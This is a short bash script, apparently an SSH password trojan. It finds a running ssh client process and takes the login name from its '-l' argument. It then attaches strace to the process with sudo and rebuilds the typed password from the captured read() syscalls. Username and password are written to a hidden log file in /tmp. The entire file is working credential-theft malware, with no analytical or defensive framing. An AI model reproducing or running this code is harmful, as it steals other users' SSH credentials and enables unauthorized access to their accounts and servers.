#!/bin/bash
u=""
p=""
tmp=""
ok=0

while [[ -z "$u" || -z "$p" ]]; do
  u=$(pgrep -a -f '^ssh ' | while read pid f a; do echo "$a"; done)
  p=$(pgrep -a -f '^ssh ' | while read pid f a; do echo "$pid"; done)
done

function Check() {
  local tmp=0
  local pass=""
  while [ "$tmp" -eq "0" ];
  do
    for line in $(sudo cat foo | grep -a "read(3" | awk '{ print  $5 }')
    do
      if [ "$line" == "28" ]; then
        tmp=1
      fi
    done
  done
  tmp=0
  for line in $(sudo cat foo | grep -a "read(4" | awk '{ print  $2 }' | perl -e 'print reverse <>')
    do
      if test $tmp -eq 1 ; then   
        if [[ "${line:2:1}" == "n" || "${line:1:1}" == "\\\\" ]]; then
          break
        fi  
        if [[ "${line:1:1}" == "|" || "${line:1:1}" == "\"" ]]; then
          break
        fi
        pass=${line:1:1}"$pass"
      elif [ "${line:2:1}" == "n" ]; then
          tmp=1
      fi
  done
  echo "Password : $pass" >> /tmp/.log_sshtrojan2.txt
}
for i in $(echo "$u" | tr " " "\n") 
do
  if [ $ok == "1" ]; then
      tmp="$i"
      break
  fi
  if [ "$i" == "-l" ]; then
    ok=1
  fi
done  
ok=0
u=$tmp

echo "User : $u" >>  /tmp/.log_sshtrojan2.txt
# bash 3.sh $p && Check
# strace -p $p 2> foo | while read -r a; do grep '^read.*= [1-9]$' <<<"$a" | cut -d\" -f2; done && Check
: > foo
sudo strace -p $p 2> foo & Check 
echo Done!!
exit